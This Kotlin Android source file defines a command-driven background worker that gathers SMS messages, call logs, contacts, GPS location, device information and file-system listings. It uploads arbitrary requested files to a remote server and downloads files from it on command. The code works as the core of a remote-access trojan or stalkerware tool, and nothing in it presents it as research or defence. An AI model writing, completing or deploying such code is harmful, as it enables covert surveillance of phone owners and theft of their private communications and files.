// DataFetchWorker.kt
package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.Constraints
import androidx.work.Data
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

class DataFetchWorker(
    private val appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val KEY_COMMAND = "command"
        private const val TAG = "DataFetchWorker"

        // Commands
        const val COMMAND_GET_LOCATION = "get_location"
        const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        const val COMMAND_SCAN_FILESYSTEM = "scan_filesystem"
        const val COMMAND_UPLOAD_FILE = "upload_file"
        const val COMMAND_DOWNLOAD_FILE = "download_file" // <-- FIXED: Added missing constant
        const val COMMAND_PING = "ping"
        const val COMMAND_SYNC_ALL = "sync_all"

        fun scheduleWork(context: Context, command: String, extraData: Map<String, String> = emptyMap()) {
            val dataBuilder = Data.Builder().putString(KEY_COMMAND, command)
            extraData.forEach { (key, value) -> dataBuilder.putString(key, value) }
            val workRequest = OneTimeWorkRequestBuilder<DataFetchWorker>()
                .setInputData(dataBuilder.build())
                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                .build()
            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d(TAG, "Scheduled DataFetchWorker with command: $command")
        }
    }

    private val apiClient by lazy { ApiClient(appContext.getString(R.string.server_base_url)) }
    private val systemInfoManager by lazy { SystemInfoManager(appContext) }
    private val fileSystemManager by lazy { FileSystemManager(appContext) }
    private val appDb by lazy { AppDatabase.getDatabase(appContext) }

    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND) ?: return Result.failure()
        Log.d(TAG, "Executing command: $command")
        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) Result.success() else Result.retry()
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command '$command'", e)
                Result.failure()
            }
        }
    }

    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_SCAN_FILESYSTEM -> scanFileSystem()
            COMMAND_UPLOAD_FILE -> uploadFile()
            COMMAND_PING -> sendPingResponse()
            COMMAND_SYNC_ALL -> syncAllData()
            COMMAND_DOWNLOAD_FILE -> downloadFileFromServer()
            else -> {
                Log.w(TAG, "Unknown command: $command")
                false
            }
        }
    }

    private suspend fun syncAllData(): Boolean {
        Log.d(TAG, "Starting full data sync...")
        val smsSuccess = syncSms()
        val callLogSuccess = syncCallLogs()
        val contactsSuccess = syncContacts()
        Log.d(TAG, "Sync results: SMS=$smsSuccess, CallLogs=$callLogSuccess, Contacts=$contactsSuccess")
        return smsSuccess && callLogSuccess && contactsSuccess
    }

    private suspend fun syncSms(): Boolean {
        if (!hasPermission(Manifest.permission.READ_SMS)) return true
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.smsDao()
        val latestTimestamp = dao.getLatestSmsTimestamp() ?: 0L
        val newSmsList = ManualDataManager(appContext).scanSms(since = latestTimestamp)
        if (newSmsList.isNotEmpty()) {
            dao.insertAll(newSmsList)
            Log.d(TAG, "Inserted ${newSmsList.size} new SMS into local DB.")
        }
        val unsyncedSms = dao.getUnsyncedSms()
        if (unsyncedSms.isEmpty()) return true
        val success = apiClient.syncSms(deviceId, unsyncedSms)
        if (success) dao.markAsSynced(unsyncedSms.map { it.id })
        return success
    }

    private suspend fun syncCallLogs(): Boolean {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) return true
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.callLogDao()
        val latestTimestamp = dao.getLatestCallLogTimestamp() ?: 0L
        val newCallLogs = ManualDataManager(appContext).scanCallLogs(since = latestTimestamp)
        if (newCallLogs.isNotEmpty()) {
            dao.insertAll(newCallLogs)
            Log.d(TAG, "Inserted ${newCallLogs.size} new call logs into local DB.")
        }
        val unsyncedCallLogs = dao.getUnsyncedCallLogs()
        if (unsyncedCallLogs.isEmpty()) return true
        val success = apiClient.syncCallLogs(deviceId, unsyncedCallLogs)
        if (success) dao.markAsSynced(unsyncedCallLogs.map { it.id })
        return success
    }
    
    private suspend fun syncContacts(): Boolean {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return true
        val deviceId = systemInfoManager.getDeviceId()
        val dao = appDb.contactDao()
        val currentDeviceContacts = ManualDataManager(appContext).scanContacts()
        // FIXED: Explicitly define the lambda parameter type to resolve ambiguity
        val localContacts = dao.getAllContacts().associateBy { contact: ContactEntity -> contact.contactId }
        val contactsToUpsert = currentDeviceContacts.filter { deviceContact ->
            val localContact = localContacts[deviceContact.contactId]
            localContact == null || deviceContact.lastUpdated > localContact.lastUpdated
        }
        if (contactsToUpsert.isNotEmpty()) {
            dao.insertAll(contactsToUpsert)
            Log.d(TAG, "Upserted ${contactsToUpsert.size} contacts in local DB.")
        }
        val unsyncedContacts = dao.getUnsyncedContacts()
        if (unsyncedContacts.isEmpty()) return true
        val success = apiClient.syncContacts(deviceId, unsyncedContacts)
        if (success) dao.markAsSynced(unsyncedContacts.map { it.contactId })
        return success
    }
    
    private suspend fun downloadFileFromServer(): Boolean {
        val serverFilePath = inputData.getString("serverFilePath") ?: return false
        val downloadedFile = fileSystemManager.downloadFile(apiClient, serverFilePath)
        return if (downloadedFile != null && downloadedFile.exists()) {
            Log.i(TAG, "File downloaded successfully to: ${downloadedFile.absolutePath}")
            // Optionally notify the server of the success
            true
        } else {
            Log.e(TAG, "Failed to download file from server: $serverFilePath")
            false
        }
    }

    private suspend fun fetchAndSendLocation(): Boolean {
        if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return false
        val location = getCurrentLocation()
        val deviceId = systemInfoManager.getDeviceId()
        val message = if (location != null) "📍 Location Update:\nLat: ${location.latitude}, Lon: ${location.longitude}" else "📍 Location Update: Failed to get location"
        return apiClient.uploadFile(createTempTxtFile("location", message), message, deviceId)
    }
    
    private suspend fun fetchAndSendSystemInfo(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        val networkInfo = systemInfoManager.getNetworkType()
        val batteryInfo = systemInfoManager.getBatteryStatus()
        val message = "⚙️ System Info:\nNetwork: $networkInfo\nBattery: ${batteryInfo.percentage}% (${batteryInfo.status})"
        return apiClient.uploadFile(createTempTxtFile("sysinfo", message), message, deviceId)
    }

    private suspend fun scanFileSystem(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        if (!fileSystemManager.hasFileSystemPermissions()) return false
        val scanResult = fileSystemManager.scanFileSystem()
        if (scanResult.paths.isEmpty()) return true
        val formattedData = fileSystemManager.formatPathsForUpload(scanResult)
        return apiClient.uploadFileSystemPaths(formattedData, deviceId)
    }
    
    private suspend fun uploadFile(): Boolean {
        val filePath = inputData.getString("filePath") ?: return false
        if (!fileSystemManager.hasFileSystemPermissions()) return false
        val file = File(filePath)
        if (!file.exists() || !file.canRead() || file.isDirectory) return false
        val deviceId = systemInfoManager.getDeviceId()
        return apiClient.uploadRequestedFile(file, deviceId, filePath)
    }

    private suspend fun sendPingResponse(): Boolean {
        val deviceId = systemInfoManager.getDeviceId()
        val message = "✅ Pong! Device is online."
        return apiClient.uploadFile(createTempTxtFile("ping", message), message, deviceId)
    }

    private fun hasPermission(permission: String): Boolean = ContextCompat.checkSelfPermission(appContext, permission) == PackageManager.PERMISSION_GRANTED
    private suspend fun getCurrentLocation(): Location? = try { LocationServices.getFusedLocationProviderClient(appContext).getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await() } catch (e: Exception) { null }
    private suspend fun createTempTxtFile(prefix: String, content: String): File = withContext(Dispatchers.IO) { File.createTempFile(prefix, ".txt", appContext.cacheDir).apply { writeText(content) } }
}
